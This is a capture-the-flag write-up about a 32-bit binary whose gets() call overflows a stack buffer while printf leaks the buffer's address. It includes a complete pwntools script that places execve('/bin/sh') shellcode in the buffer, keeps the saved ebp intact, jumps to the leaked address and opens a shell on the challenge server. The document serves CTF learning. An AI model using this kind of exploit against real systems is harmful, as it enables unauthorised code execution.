## Description

Let's decompile the binary with Ghidra.

```c
undefined4 main(void)
{
  char local_30 [32];
  undefined *local_10;
  
  local_10 = &stack0x00000004;
  setbuf(stdout,(char *)0x0);
  setbuf(stdin,(char *)0x0);
  setbuf(stderr,(char *)0x0);
  puts("What\'s my hard counter?");
  printf("hint: %p\n",local_30);
  gets(local_30);
  return 0;
}
```

We get a possible buffer overflow with the `gets` function, and the `printf` leaks the address of the buffer. We check the security of the binary, and surprisingly, NX is disabled. 

## Solution

As NX is disabled, we can include a shellcode in the buffer and jump there. The only thing that I had to do in addition was to preserve the value of `ebp` on the stack (otherwise I had a segfault when leaving the function), but then its value is known once we know the address of the buffer.

```python
from pwn import *

sh = remote('p1.tjctf.org', 8011)

shellcode = asm(shellcraft.i386.linux.execve('/bin/sh'))
print(len(shellcode))

print(sh.recvuntil("hint: ").decode())
addr = sh.recvline().decode()
buf_addr = int(addr, 16)
print(hex(buf_addr))
print(addr)

ebp_value = buf_addr + 0x40

payload = shellcode + b"\x00"*(32-len(shellcode)) + p32(ebp_value) + b'a'*24 + p32(buf_addr)

sh.sendline(payload)
sh.interactive()
```
